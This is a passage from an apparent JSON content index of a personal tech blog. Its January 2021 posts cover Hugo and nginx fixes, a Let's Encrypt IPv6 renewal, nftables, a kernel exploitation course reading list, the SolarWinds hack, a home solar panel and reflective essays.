","permalink":"https://blog.akendo.eu/flash/28.01.2021-linkdrop/","tags":[],"title":"28.01.2021 - link drop"},{"categories":["Blog"],"contents":"Today was a quite busy day with minor things. I’ve fixed the Hugo related things and updated the contact page to be reachable again. The issue here was that I’ve created a subfolder for it and name the page _index.md. I’m not sure if Hugo has changed something in that behavior, but suddenly this page didn’t load anymore. He only displayed a single digit. After renaming it to index.md it was generated again.\nAlso, I’ve changed the virtual host redirection configuration, http://akendo.eu was correctly redirected to the blog subdomain. The SSL version of the vhost did not. It is fixed now. As a side note to this: When using nginx try to avoid the ipv6only=on parameter[0] for virtual hosts.\nI\u0026rsquo;ve started to write some text for the about page and going to put it online later. But man, I\u0026rsquo;m happy about these improvements! Thanks for people point it out.\n[0] https://serverfault.com/questions/842492/nginx-duplicate-listen-options-for-80-error/842515\n","permalink":"https://blog.akendo.eu/post/2021-01-28-blogfixes/","tags":["Hugo","nginx,","ipv6","100DaysToOffload"],"title":"Blogfixes"},{"categories":["Blog"],"contents":"With the change to shortcodes, Hugo seemed to have drop support for inline HTML code in markdown. As written before, this causes a bit of an issue. Just now, I figured out that the math.js library wasn’t loaded and causes some posts to be affected. Hence, I’ve created a new shortcode calls mathjs.html. It is similar to this example[0].\ncat mathjs.html \u0026lt;script type=\u0026#34;text/javascript\u0026#34; async src=\u0026#34;/js/MathJax.js?config=TeX-MML-AM_CHTML\u0026#34;\u0026gt; \u0026lt;/script\u0026gt; Now all posts that need math.js can include these lines with the following shortcode, Instead of having native HTML/JavaScript code. I’m not sure if I like it.\nso far,\nakendo\n[0] https://gohugo.io/templates/shortcode-templates/#single-word-example-year\n","permalink":"https://blog.akendo.eu/post/2021-01-28-fix-mathjs-in-hugo/","tags":["Hugo","100DaysToOffload"],"title":"Fix Mathjs in Hugo"},{"categories":["Security"],"contents":"One of my plans was to learn about security[0]. My ToDo list is massively full of different topics I want to put some attention on. While reviewing some of that tasks, a quite recent topic crossed my list: kernel exploitation.\nThis topic was showing on my Twitter feed. It combines several fascinating subjects, I think. The Linux kernel, hacking, and obviously creating exploits. Because I suck at writing exploits, this will be a valuable practice.\nBecause I have tons of resources related to that matter, I like to share them here. Andrey Konovalov[1] has a good collection[2] of resources on this matter. Browsing through the collection of links, I saw a very novel course. It is the pwn.college[3].\nBecause I have tons of resources related to that matter, I like to share them here. Andrey Konovalov[1] has a good collection[2] of resources on this matter. Browsing through the collection of links, I saw a very novel course. It is the pwn.college[3]. So I’ve decided to start the course[4] on kernel exploitation today.\nCurrently, I’m looking for someone I can do this course with. It should be nothing too crazy, just some to talk about problems and issues with potential solution attempts and so on.\nHere are some other resources that might be useful to that topic but not directly associates with the topic. One resource that belongs to this is configuring gdb[5]. That’s one of the next steps I’m going to read through.\nAs one of the next steps, I\u0026rsquo;m going to read through the links.\nKernel Boot Process[6] Say hello to x86_64 Assembly [part 1][7] Welcome page of the cse466.pwn.college![8] so far,\nakendo\n[0] https://blog.akendo.eu/post/2021-01-02-learning-security [1] https://github.com/xairy [2] https://github.com/xairy/linux-kernel-exploitation [3] https://pwn.college/ [4] https://pwn.college/modules/kernel [5] https://www.kernel.org/doc/Documentation/dev-tools/gdb-kernel-debugging.rst [6] https://0xax.gitbooks.io/linux-insides/content/Booting/ [7] https://0xax.github.io/asm_1/ [8] https://cse466.pwn.college/\n","permalink":"https://blog.akendo.eu/post/2021-01-25-kernel-exploitation/","tags":["Learning","Kernel","100DaysToOffload"],"title":"Kernel Exploitation Intro"},{"categories":["Review"],"contents":"This week the first difficulties in writing every arise. Basically, I\u0026rsquo;m missing the necessary time to get things done. Why is this now?\nBut first things first, what have changed in the last week?\nPV (part two) Rust nftables kernel exploration Blog CI/CD Almost all topics stayed the same. I moved on with kernel exploration, but I have to put the notes into a more readable state. I worked on the CI/CD pipeline, but my server broke down. I updated various things within the blog. Some other topics became more urgent over the week. For instance, I had to update the MediaWiki to fix some bugs. I did continue on that matter and going to add this to the list now.\nIntrospection Let us ask ourselves why. The question should be more directed to where the time went. For once, I had to fight with one server that was crashing. The server was host to many services like grafana, a data processing program to collect information from the PV panel. I\u0026rsquo;m in the process of replacing it, until now. Here I got side-tracked and was suddenly fighting with system updates for a Gentoo host.\nThose are the subjects for the technical nature. For writing, the problem was that I suddenly been confronted with spending more time incorporating feedback than I anticipated. My idea was to write as the first thing each morning. I did not foresee the time feedback requires. Whenever a post is published, some of you are providing suggestions for improvements. That is new.\nMostly, I spend the time re-phrasing posts and improve grammatical errors. Ahhh sweet, sweet grammar issues\u0026hellip; Grammar has always been one weak point of mine. Some of you have pointed that out. I very thankful for it and try to incorporate all of it. Yet whenever someone points such a mistake out, it hurts. To improve on my Grammar I\u0026rsquo;m using grammarly[0] now.\nDue to that fact, I do much more patching the actual writing moved into the evening. I tend to push a post without the necessary love for details. That is causing more patchwork to be done and causes new stuff to go online even further\u0026hellip; damit it.\nI guess pushing new stuff every day has its downside. The underlying fact is that with an increased rate of posts that the quality dwindles. It is reasonable, but here comes another matter of perfectionism. I do not want these mistakes in there and coping with that makes this thing difficult.\nConclusion The best guess I have for now to improve is by changing the writing habit. I’m going to compose new posts in the evening. The next morning, I will re-read the post for spelling errors before I publish it. This way, I can catch potential more flaws can improve things one more before it goes online. Let us see how things are going to be in this week!\nso far,\nakendo\n[0] grammarly.com\n","permalink":"https://blog.akendo.eu/post/2021-01-24-review-cw4/","tags":["100DaysToOffload"],"title":"Review CW4"},{"categories":["Blog"],"contents":"In this post[0], I wanted to think about feedback. While I was writing on it, I notice how I was slowly drifting. After a while, I decided to move this matter into a post of it its own. The topic is narrative[1].\nHumans tend to create stories as a form of experience processing. It\u0026rsquo;s a beautiful mechanism of our brain. I think it relates to the capabilities to store memories long term. We tend to remember stories rather than the experience. The brain of a child can only start to make memories once it develops an understanding of language.\nIt might be related to the fact that our brain tries to \u0026lsquo;clean\u0026rsquo; up unnecessary information and re-arrange stored experience in the form of a narrative. In short: the brain uses a story mechanism to simplify the perceived details and aspects of a moment and tries re-merge it with existing information for rapid access[2]. A leak of this means that we can not form clean memories of events.\nYet in these mechanisms for a narrative lies some danger, the danger of a defining narrative. To explain this in more detail: Someone tries to tell every moment of life through a fixated lens that puts information into a fitting narrative. The danger lies in the fact that this is happing without asking questions rather than this narrative representing reality or not. I think that depression might be an example of this.\nIn the worse case, the \u0026lsquo;why\u0026rsquo; question is asked, but answer by the defining narrative without bothering to check if the underlying assumption is correct. Here the confirmation bias[3] comes into play that seeks out information to support only our narrative or worldview. These narratives tend to make us inflexible and stall, it implies a risk of halting our development.\nYou could see such a narrative as a way to model the world too. You not only try to explain the past but also to predict the future. Because once you let the narrative define your worldview, it will be the source of much pain. It relates to the situation when you are, confronted with an event or information that can\u0026rsquo;t be predicted by such a model of the world or even worse it contradicts it even. It will confront you with negative things and once we\u0026rsquo;re in the emotion of pain we lose our ability to think logically and that makes us prone to all sorts of wired arguing.\nSuddenly we’re in a state of scarcity and discomfort and all that we’re trying is to restore the consistent worldview we had before. When in this pain we’re in fact confronted with uncertainty. We do not know what to expect and that cost mental capabilities we rather not like to spend.\nThe stronger a narrative is defined, the harder the contradict will be perceived by someone. That\u0026rsquo;s why people who are more ignorant tend to be happier, they just skip the unpleasant facts and continue on with their narrative disregard of reality. People like to have a consistent worldview.\nTherefore, I think it\u0026rsquo;s important to keep a fresh mind to not become lock-in by a specific narrative. We need to keep learning and adapt to the needs of reality as it comes to not become isolated. That\u0026rsquo;s why it\u0026rsquo;s important to develop, the world is a moving target and so do we have to keep adapting to it.\nFocusing on the why is more curtail than being in the right, but this is way more difficult than a defining narrative. This is what I’m trying to aim for in life. I try to ask why someone tends to disagree, why something is, and taking the time to listen. Why is the person not understanding my point or why this is a concern. This is hard and I’m failing often with it, but I eventually it will work someday.\nSo try to keep a fresh mind.\nso far,\nakendo\n[0] https://blog.akendo.eu/post/2021-01-19-learning-mindset/ [1] https://en.wikipedia.org/wiki/Narrative_psychology [2] https://en.wikipedia.org/wiki/Neuroplasticity [3] https://en.wikipedia.org/wiki/Confirmation_bias\n","permalink":"https://blog.akendo.eu/post/2021-01-21-defining-narrative/","tags":["narrative","brain","100DaysToOffload"],"title":"The defining narrative"},{"categories":["Blog"],"contents":"I put all the posts by default draft mode. This is done by having an archtype[0] document. This is the documenation of it, because it is not an option with the configuration file it seems worth the effort.\nIt looke like this now:\n--- title: \u0026#34;{{ replace .Name \u0026#34;-\u0026#34; \u0026#34; \u0026#34; | title }}\u0026#34; date: {{ .Date }} categories: [] tags: [] draft: true --- When hugo should render them in the server mode you can use -D or --buildDrafts to do so.\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-01-20-hugo-new-post-draft/","tags":["Hugo","100daystooffload"],"title":"Set a new posts in Hugo to draft"},{"categories":["Blog"],"contents":"In the recent days, I\u0026rsquo;ve got some neat feedback about some posts and I must say that I love it. However, I want to highlight a notion: Everything that is write here, is a representation of my humble understanding of the world. Nothing more, nothing less, and that is why nothing that was written here is really fixated. The process of writing is helping me to understand more what\u0026rsquo;s going on in the world.\nThe world is complicated and there are SO much information to every topic, things change rather fast. At a certain point you learn, that you do not know that much of the world as you though, hence you find different ways of explain what\u0026rsquo;s going on. You begin to devise model that tries to describe a given thing. Still, these models are never correct. Just useful enough to \u0026lsquo;predict\u0026rsquo; or reason about a thing or two. We\u0026rsquo;re always left with an incomplete representation of reality. Therefor it is important to remain open for new information, theories and ideas that might improve over view of the world.\nWhich brings me to the point: Writing should be understood as thinking and what was written in here as depiction of the thinking process. It helps me to integrate information more deeply by testing what was perceive. By convey concepts, ideas and notion into written form it transforms it. It is this very moment when you really learn and that\u0026rsquo;s the goal in the end and this is the learning mindset I\u0026rsquo;m aiming for.\nObviously, composing text is difficult1 and it is even harder to portray to others what you\u0026rsquo;re thinking in written form. This is what I\u0026rsquo;ve noticed while reading feedback some of you had provided. To re-iterate this in more detail: People seemed to miss the point of what I was trying to express in the first place, instead they focused stronger on the subject of the texts there were able to relate to.\nThat might relate to fact that they are more conformable with that subject, but it implies to me that the text was not well enough phrased and mislead people in the ideas, I\u0026rsquo;ve tried to convey. This might be ground in the fact that the time I spend on some posts is more limited and because I\u0026rsquo;m more focused on getting thing out it causes the quality to miss out. For instance, this post takes already more time that I planned to. Right now I\u0026rsquo;m in the process of figuring out, the right amount of time to spend on writing. I should be enough to get to the point. However, OI think it\u0026rsquo;s also something you\u0026rsquo;re getting better over time.\nso far,\nakendo\nDoes this imply that thinking is hard?\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://blog.akendo.eu/post/2021-01-19-learning-mindset/","tags":["Feedback","Writing","100DaysToOffload"],"title":"a learning mindset"},{"categories":["Nothing"],"contents":"You\u0026rsquo;re at a party, talking to your friends and feeling comfortably at first. But at some point, rather then enjoying yourself, it starts to feel like that something is missing. The conversations you\u0026rsquo;re having going a way you know. Not that you can say what there are going say exactly or what words are going to used, but you know the refrain, just like a pop song. Like any pop song. Words slip through, the voices soften.\nAn odd feeling kicks in and while you\u0026rsquo;re surrounded by friends and family a feeling of hollowness arises. Everything seems pointless, every words seems empty. Nothing matters any more. You\u0026rsquo;re alone. Alone in the middle of everyone, why? How? You mind can\u0026rsquo;t answer, you mind does not know why and all what you\u0026rsquo;ve having is boredom.\nThe voices fades away, everyone is absorbed by themself. You have no role to play, you\u0026rsquo;re outside. Left behind. You\u0026rsquo;re left alone. You want to belong to the other, you want to be seen. But instead of expression your wishes, thought, you play alone with the refrain. Like everyone else.\nYou don\u0026rsquo;t ask the questions you want to, you do not ask for what\u0026rsquo;s the matter. Until it is over and you leave as empty as you have come. Spend time of your life for\u0026hellip;? No one can tell you, no one knows.\n","permalink":"https://blog.akendo.eu/post/2021-01-18-alone/","tags":["100daystooffload"],"title":"Alone"},{"categories":["review"],"contents":"Yesterday was the first day I did not push a blog post because, I took a break. This was done deliberately, posting everyday is quite exhausting\u0026hellip; However, writing becomes smoother, I think. I did not go much feedback in the last days, but I think the topics were a bit less insightful then the week before. Besides, did not share that much over social network this week.\nI started to split big topics into smaller posts. This way I just write one or two paragraphs about a subject and then I move over. For this week I want to have themes for everyday, this way I\u0026rsquo;m more focused on that topic and be more constant overall.\nThe open topics are:\nPV (part two) Rust nftables kernel exploration Blog CI/CD The rust topic is the new one and I already have the initial draft for the problem situation ready. I currently struggle to find good time to focus more deeply on a topic. Hence in the moment I\u0026rsquo;m only working down my todo list with texts bit by bit about some subjects.\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-01-18-review-cw3/","tags":["100daystooffload"],"title":"Review CW3"},{"categories":["Dev"],"contents":"I\u0026rsquo;m a big rust[0] fan. It is difficult to argue why, but most likely because of feels quite alright.\nI have a good intuition and rust does do everything the right way. It is similar to C, but does not share it friction. When learning C it always felt complicated. Error messages made little senses and you become busy more with the tool landscape around than actual programming.\nAdditionally, you\u0026rsquo;re responsible for the memory management. Which implies that unless you known exactly how, you\u0026rsquo;re going o introduce memory corruption bugs. Modern C++ does help a lot to mitigate it, however, I\u0026rsquo;m unsure if it is able catch it all.\nWhile rust does imposes also memory management onto you, it\u0026rsquo;s implication are almost free of memory corruption bugs, but without the disadvantage of a huge infrastructure like a garbage collector.\nInterpret language always had a biter sweet side effect. There are deadly simple, but I often feel like that there are not that effective computing wise. You always have to pay much more overhead. That\u0026rsquo;s what I love in rust, you pay only for what you get.\nso far,\nakendo\n[0] https://www.rust-lang.org/\n","permalink":"https://blog.akendo.eu/post/2021-01-16-rust/","tags":["Rust","100DaysToOffload"],"title":"Rust"},{"categories":["Blog"],"contents":"Today is going to be a short one: Instead of writing much, I\u0026rsquo;ve updated the tags and categories for the blog. It was necessary to create a new layout file[0] that would list the tags. I made some minor changes to the example code and placed in in the header of each post.\nNow all my posts regard the 100DaysToOffload are locate as tag here[1]. It took me a bit of time to clean up all the posts of the recent days and learned that tagging is quite difficult to get right.\nso far,\nakendo\n[0] https://www.jakewiesler.com/blog/hugo-taxonomies [1] https://blog.akendo.eu/tags/100daystooffload/\n","permalink":"https://blog.akendo.eu/post/2021-01-15-updated-tags/","tags":["Hugo","100DaysToOffload"],"title":"Updated Tags"},{"categories":["Security"],"contents":"As you may or may not know, one quite big hack went through the media lately, Solar Wind[0][1].\nRather than jumping on the bandwagon, I like to share a thought about it. Part of this attack was possible because of a quite generic software solution. By generic, I mean to say that the software, was used everywhere. How widely was the software used that we consider it to be generic? Even Microsoft has used it and has been therefore affected[2] by it. When a software solution is that widely in use, it becomes an attack vector.\nThe iPhones contrast I like to make a comparison to the situation. I think of the iPhone because it shares the same problem here. Apple puts a lot of effort into making it reasonably secure. This comparison depends on how your threat model is looking. But when software becomes so similar on so many devices, it is easier for an attacker. He only needs to find a single vulnerability to exploit the entry ecosystem potentially.\nAll iPhones are operated with quite a similar software stack, leading to a situation where a single exploit can work on almost all devices. Of course, there are variations within the different device generations. Despite Apple\u0026rsquo;s effort, they\u0026rsquo;re having difficulty keeping software regression at bay, which causes older flaws that were exploitable to work on newer devices and releases again.\nIt is funny to see that the fractured market that Android resembles becomes an advantage now. To put this into an example: We tried to build an exploit of the well-known StageFright vulnerability because the Android ecosystem was built with different environments including varying versions oflibc, causing our exploit-code to go awry quickly1. The point I\u0026rsquo;m here is that diversity in software adds complexity in the exploit creation. It\u0026rsquo;s more effort for someone than in an ecosystem that is not as homogeneous as Apple\u0026rsquo;s ones.\nTo remove the iPhone out of this example, we could use a forest instead. When we have only one type of tree, it becomes massively vulnerable to bugs, viruses, and any malicious actor (including humans!). When different types of trees are present within the forest, it becomes harder for an invading actor to take over the entire forest.\nConclution Would a more diverse software landscape be better? Most likely not. We should take into account that the risk of exploitation becomes higher with generic software. This fact needs to be reflected by the threat model.\nThis type of risk is not a problem for everyone. Most people will not care about it and will be most likely be okay with it. It is interesting for everyone who needs to consider this as a valid risk.\nDiversification could be a quite interesting approach to mitigate that risk. However, it could also lead to just too many more vulnerable software systems. It is vital to understand that this not one size fits it all solution, but a pattern.\nso far,\nakendo\n[0] https://www.schneier.com/blog/archives/2020/12/russias-solarwinds-attack.html [1] https://www.nytimes.com/2020/12/14/us/politics/russia-hack-nsa-homeland-security-pentagon.html [2] https://msrc-blog.microsoft.com/2020/12/31/microsoft-internal-solorigate-investigation-update/\nNot taking into account that this was done by a friend and not me. Also because I suck at writing exploits.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://blog.akendo.eu/post/2021-01-14-generic-software/","tags":["Hacks","100daystooffload"],"title":"Generic Software is an attack avenue"},{"categories":["Linux"],"contents":"On one of my domains I had the following error message when trying to renew the Let\u0026rsquo;s Encrypt (LE) Certificate:\nroot@vm:~/dehydrated# bash dehydrated -f config -c # INFO: Using main config file config Processing domain.tld + Checking domain name(s) of existing cert... unchanged. + Checking expire date of existing cert... + Valid till Jan 10 08:04:02 2021 GMT (Less than 30 days). Renewing! + Signing domains... + Generating private key... + Generating signing request... + Requesting new certificate order from CA... + Received 1 authorizations URLs from the CA + Handling authorization for domain.tld + 1 pending challenge(s) + Deploying challenge tokens... + Responding to challenge for domain.tld authorization... + Cleaning challenge tokens... + Challenge validation has failed :( ERROR: Challenge is invalid! (returned: invalid) (result: [\u0026#34;type\u0026#34;] \u0026#34;http-01\u0026#34; [\u0026#34;status\u0026#34;] \u0026#34;invalid\u0026#34; [\u0026#34;error\u0026#34;,\u0026#34;type\u0026#34;] \u0026#34;urn:ietf:params:acme:error:connection\u0026#34; [\u0026#34;error\u0026#34;,\u0026#34;detail\u0026#34;] \u0026#34;Fetching http://domain.tld/...: Error getting validation data\u0026#34; [\u0026#34;error\u0026#34;,\u0026#34;status\u0026#34;] 400 [\u0026#34;error\u0026#34;] {\u0026#34;type\u0026#34;:\u0026#34;urn:ietf:params:acme:error:connection\u0026#34;, \u0026#34;detail\u0026#34;:\u0026#34;Fetching http://domain.tld/...: Error getting validation data\u0026#34;,\u0026#34;status\u0026#34;:400} [\u0026#34;url\u0026#34;] \u0026#34;https://acme-v02.api.letsencrypt.org/acme/chall-v3/...\u0026#34; [\u0026#34;token\u0026#34;] \u0026#34;...\u0026#34; [\u0026#34;validationRecord\u0026#34;,0,\u0026#34;url\u0026#34;] \u0026#34;http://domain.tld/...\u0026#34; [\u0026#34;validationRecord\u0026#34;,0,\u0026#34;hostname\u0026#34;] \u0026#34;domain.tld\u0026#34; [\u0026#34;validationRecord\u0026#34;,0,\u0026#34;port\u0026#34;] \u0026#34;80\u0026#34; [\u0026#34;validationRecord\u0026#34;,0,\u0026#34;addressesResolved\u0026#34;,0] \u0026#34;95.217.XXX.XXX\u0026#34; [\u0026#34;validationRecord\u0026#34;,0,\u0026#34;addressesResolved\u0026#34;,1] \u0026#34;2a01:4f9:XXXX:XXXX::1\u0026#34; [\u0026#34;validationRecord\u0026#34;,0,\u0026#34;addressesResolved\u0026#34;] [\u0026#34;95.217.XXX.XXX\u0026#34;,\u0026#34;2a01:4f9:XXXX:XXXX::1\u0026#34;] [\u0026#34;validationRecord\u0026#34;,0,\u0026#34;addressUsed\u0026#34;] \u0026#34;2a01:4f9:XXXX:XXXX::1\u0026#34; [\u0026#34;validationRecord\u0026#34;,0] {\u0026#34;url\u0026#34;:\u0026#34;http://domain.tld/...\u0026#34;, \u0026#34;hostname\u0026#34;:\u0026#34;domain.tld\u0026#34;,\u0026#34;port\u0026#34;:\u0026#34;80\u0026#34;,\u0026#34;addressesResolved\u0026#34;:[\u0026#34;95.217.XXX.XXX\u0026#34;,\u0026#34;2a01:4f9:XXXX:XXXX::1\u0026#34;], \u0026#34;addressUsed\u0026#34;:\u0026#34;2a01:4f9:XXXX:XXXX::1\u0026#34;} [\u0026#34;validationRecord\u0026#34;] [{\u0026#34;url\u0026#34;:\u0026#34;http://domain.tld/...\u0026#34;,\u0026#34;hostname\u0026#34;:\u0026#34;domain.tld\u0026#34;,\u0026#34;port\u0026#34;:\u0026#34;80\u0026#34;, \u0026#34;addressesResolved\u0026#34;:[\u0026#34;95.217.181.151\u0026#34;,\u0026#34;2a01:4f9:XXXX:XXXX::1\u0026#34;],\u0026#34;addressUsed\u0026#34;:\u0026#34;2a01:4f9:XXXX:XXXX::1\u0026#34;}]) So, what went wrong? It took some time to figure it out and after some searching I learned that Let\u0026rsquo;s Encrypt prefers IPv6 now.[0] However, the server was listing only on IPv4 socket for HTTP connections. HTTPS connection had the keyword to listen on IPv6 enabled. Hence the fix was quite simple, just adding the listen [::]:80 to virtual host.\nroot@vm:~/dehydrated# bash dehydrated -f config -c # INFO: Using main config file config Processing domain.tld + Checking domain name(s) of existing cert... unchanged. + Checking expire date of existing cert... + Valid till Jan 12 18:34:42 2021 GMT (Less than 30 days). Renewing! + Signing domains... + Generating private key... + Generating signing request... + Requesting new certificate order from CA... + Received 1 authorizations URLs from the CA + Handling authorization for domain.tld + 1 pending challenge(s) + Deploying challenge tokens... + Responding to challenge for domain.tld authorization... + Challenge is valid! + Cleaning challenge tokens... + Requesting certificate... + Checking certificate... + Done! + Creating fullchain.pem... + Done! root@vm:~/dehydrated# /etc/init.d/nginx restart Once the certificate was place and nginx was restarted everything seemed fine, expect for this error in Firefox:\nWhat the hell? The problem here is that LE uses ECDSA[1] nowadays. That\u0026rsquo;s a change that I\u0026rsquo;m not quite feeling comfortable with, because I\u0026rsquo;ve hardened the encryption chipers some time ago and it includes the following lines:\n... ssl_protocols TLSv1.2 TLSv1.3; ssl_ciphers \u0026#39;...:+SSLv3:!aNULL:!eNULL:!LOW:!3DES:!MD5:!EXP:!P SK:!DSS:!RC4:!SEED:!IDEA:!ECDSA:kEDH:CAMELLIA128-SHA:AES128-SHA\u0026#39;; ssl_prefer_server_ciphers on; ... The important keyword is \u0026lsquo;!ECDSA\u0026rsquo; that tell nginx to not allow ECDSA as a valid chiper for connections. For the moment, I\u0026rsquo;ve remove this entry to make it work, but I\u0026rsquo;m going to renew it with something else later. I also have to updated my knowledge about ECDSA, because it is rather briefly then details enough. Yet there were quite some good reasons not use it, I just can\u0026rsquo;t remember it.\nso far,\nakendo\n[0] https://community.letsencrypt.org/t/error-getting-validation-data-status-400/50287\n[1] https://letsencrypt.org/2020/09/17/new-root-and-intermediates.html\n","permalink":"https://blog.akendo.eu/post/2021-01-13-lets-encrypt-ipv6/","tags":["Security","nginx","100daystooffload"],"title":"Let's Encrypt and IPv6"},{"categories":["PV"],"contents":"This is a follow up post for my PV.\nOne thing that was important to me when installing the Solar-Panel was to know how much energy was generated. When you buy a PV panel there often offer you some sort of power meter. This things are almost always a rip off in my opinion.\nInstead of such a thing, I used a regular power meter you can get at any eclectic shop. You might wonder why I think this and the answer is quite simple. It makes no different where the power is recorded.\nBecause the inverter turns the generated AC into DC to make it consumable for the gird we can treat as normal consumer. This relates to the fact that AC is always bidirectional. Hence, I get all power recorded that is directed from the inverter just before it enters my local grid.\nImprovised power recording One that first day we had quite a lot of sun and it gave me even with some shade on the panel 144W, neat.\nIt was intended to have a more better power meter, however, because it took ages for the inverter to be delivered, I did not got anything better until much later. On the first days, I\u0026rsquo;ve wrote the power recorded by hand on the end of a day. In the next post I\u0026rsquo;m going to describe how this got into grafana and using a automated way to get the power recorded.\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-01-12-pv-power-recording/","tags":["Inverter","PV","100daystooffload"],"title":"Power Recording"},{"categories":["Linux"],"contents":"In the last days I\u0026rsquo;ve been fighting with nftables.\nnftables is the next generation part for package filtering within the kernel space. Not sure if about the \u0026rsquo;next generation\u0026rsquo; thing, because there is already another packet filter infrastructure within the kernel or even more? Anyhow, nft was replace on one Vm as the default solution and until recently I didn\u0026rsquo;t have heard of it.\nOn my mail server it is the default solution for package filtering, for some reason. I\u0026rsquo;ve not really configured it. I quite went crazy cause I need to open up an additional port and no iptables rule where present.\nHere the first problem cam to show, nftables does not have a good interface or command tool for telling you. iptables does offer a list option that indicating to you what was loaded and what wasn\u0026rsquo;t. nftable is rather unforgiving to user input that does not exactly follow it\u0026rsquo;s specification\u0026hellip;baeh.\nI\u0026rsquo;m going to follow this up with some details in a later post.\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-01-11-nf-table/","tags":["nftable","iptables","100daystooffload"],"title":"nftables"},{"categories":["Review"],"contents":"The first week of January is completed and as every week I review what went on. The idea of a frequent review comes from the book \u0026lsquo;Get things done\u0026rsquo; and this blog is a part of it now. First of all, I\u0026rsquo;m pleased about the week: I got quite some feedback from people. For instance: Some Users reported broken stuff on the blog page. I\u0026rsquo;m going to fix this later this week. Thank you for report it!\nI\u0026rsquo;m going to fix them later this week, however, I need to address some other issues before that causes friction in my work flow. For instance this week I was trouble with handling image size and placement. Hugo does not allow you to place image elements within your written markdown document. They \u0026lsquo;fixed\u0026rsquo; this by implemented a short-codes feature within Hugo. I copied the example into my blog and going to adjust it to my needs.\nA smaller topic is how I use categories and tags, It should be re-arrange because currently I post most entries as a categories of 100daystooffload. Instead this should be done be a tag, because it might confuses when someone is interested in only one specify categories, it gives them the freedom to filter more effective.\nLastly, I need to setup a CI/CD pipeline. This relates to the trouble of mine to solve something but introducing more friction that remains unresolved. The solution are working well, but often with some type of hiccup that makes it unpleasant to use. This blog is no exception and I always wanted to just run git push to deploy a new post, however, so far I did not took the time to do so. But it is on the ToDo-List1.\nSo far for the technical aspects, some other related to the process of writing. The issue is perfectionism: With limited time at hand I often tend to be unsatisfied with the composed text. It feels like that I did not got the point from my head down to the paper. It is getting better ,however,it is something difficult to cope with. In detail I feel like that when I compose something it should resembles something of value, something with wisdom or that people see as worth it to read. But when you only have like 10 minutes to write, what should you write about? I\u0026rsquo;m not sure how to do it yet, but we\u0026rsquo;ll see.\nso far,\nakendo\nI\u0026rsquo;ve already started to implemented some thing with Gogs and docker, however, things are more complicated as initially anticipated.\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://blog.akendo.eu/post/2021-01-10-review/","tags":["100DaysToOffload"],"title":"Review CW-2"},{"categories":["Blog"],"contents":"What makes a decision a good one? What makes it a bad one? I often notice that there are not good or bad decisions, instead we should ask ourself: What are good metrics for us to decided that something was or wasn\u0026rsquo;t well resolute?\nAn interesting insight to this question is that our decisions often are not made in the moment of true, but afterwards. You only know that something is worth the effort until you actually went through with it. Everything else is just speculation.\nI think this has several reason, one strong aspect is decision fatigue, but also to the problem that we do not have the time to really process all the information necessary to make good conclusion, for the reason that we\u0026rsquo;re lacking information or because we\u0026rsquo;re overflown by them. And because of this we\u0026rsquo;re confronted with an incomplete view of what is to expected on the paths ahead of us.\nDecision fatigue is the moment when our mental capacity is exhausted and yet need to come to an conclusion. It is the point where we resort to corner cutting. Trying to find ways to decided something to the most closed thing. However this often leads to bad choices.\nWhen you think about this it we have an infinite complex universe in front of us and our brain needs to make the \u0026lsquo;right\u0026rsquo; choice. But what might be seen as the correct answer for the brain is often rather short-term. Our brain act very short-sided in moment of scarcity by trying to feel good now instead of considering the long-term effects.\nThat\u0026rsquo;s why habits are so important: They reflect a path of decision already made and removes strain from our brain. It is the reason why we bear to things we already know, Resorting to habits (even the bad one) already learning, This are things that make the future more certain for us.\nThat\u0026rsquo;s why reflection is important, it helps us to introspecting decisions made and ask with more time at our hand: Was this good? Did it feel well?\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-01-09-decisions/","tags":["100daystooffload"],"title":"Decisions"},{"categories":["PV"],"contents":"Since my youngest days I’m fascinated by PV-panels, Photo Voltaic or simple solar panel. When you think about it, it is a piece of metal that you put into a sunlight beam an it produces power.\nEven more absurd when you think of this like a hundred years ago. With they idea of coal and steal and that creating power is hard work and now I’m having this thing just hanging around keeping it reasonable clean and got my power. Also, it is free power ;-)\nFor that reason I\u0026rsquo;ve got in 2019 a PV Panel:\nOn top you see the inverter, it converts the power of the sun into regular AC and allows it to enter it into the power grid. The power will be consumed right away and does not really leave my flat. This will be the first post in series about my steps to get this PV productive.\n","permalink":"https://blog.akendo.eu/post/2021-01-08-photo-voltaic/","tags":["100daystooffload"],"title":"Photo Voltaic"},{"categories":["Linux"],"contents":"Today this is going to be a short one:\nI was fighting with my Task Warrior to create recurrence tasks. I\u0026rsquo;m using it for my daily habits. The problem seems at first to be setting recurrence.limit within the taskrc configuration file. Not sure what went wrong at first, because for days no new recurrence were created. Unti I read the the documentation again:\nIn this example one task instance is generated for the next due period. This is because the configuration setting recurrence.limit is set to 1, the default. If this number is increased to 2, then you would see the next 2 instances generated. Note that this only generates two steps into the future, without regard for whether those two instances are completed or not - don\u0026rsquo;t expect to complete the first task and see a new one pop up immediately.\nInitially, I wanted to write about the problem, but just by blogging about this I solved the problem: I mixed up the until and the due date\u0026hellip;gosh\u0026hellip;thanks blogging, guess this works as a rubber duck debugging as well!\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-01-07-task-warrior-recurrence/","tags":["TaskWarrior","100daystooffload"],"title":"Task Warrior Recurrence"},{"categories":["Blog"],"contents":"As a follow up of my yesterdays post I\u0026rsquo;ve created a new mail account for this very blog: blog@akendo.eu for direct responses. Feel free to drop me a mail with some feedback!\nSo far I\u0026rsquo;ve avoided this matter for the reason that I think that it rather fosters spam than \u0026lsquo;real\u0026rsquo; mails. Also, I\u0026rsquo;ve posted this posts on some reddit channel I kind of do not know what to think of to be honest. But I do not had so much experience with it so far and I\u0026rsquo;m willing to give it a try.\nI\u0026rsquo;ve avoided sharing my post so far because I\u0026rsquo;m afraid. Afraid of a shitstrom, afraid of begin judged. Whenever I try to write something online this fear pops into our mind. I know why it\u0026rsquo;s there, I know that it does not represent the risk accurate, however, it is difficult to get over it. Opening up with more channels of communication just intensifies this.\nObjective looking, there is no reason for any type of shitstorm whatsoever, instead it\u0026rsquo;s a availability bias that leads me to believe this could be a likely outcome. It relates to the fact that I\u0026rsquo;ve been on the internet so 